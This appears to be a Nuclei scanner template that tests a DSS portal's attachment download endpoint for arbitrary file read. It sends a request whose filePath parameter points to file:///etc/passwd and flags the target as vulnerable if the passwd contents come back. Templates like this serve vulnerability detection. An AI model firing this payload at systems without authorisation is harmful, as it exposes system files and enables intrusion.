id: dss-download-fileread
info:
  author: ritikchaddha
  name: DSS Download File Read
  severity: high
  tags: lfi,dss,lfr
requests:
- matchers:
  - regex:
    - 'root:[x*]:0:0:'
    type: regex
  - status:
    - 200
    type: status
  matchers-condition: and
  max-redirects: 2
  method: GET
  path:
  - '{{BaseURL}}/portal/attachment_downloadByUrlAtt.action?filePath=file:///etc/passwd'
  redirects: true
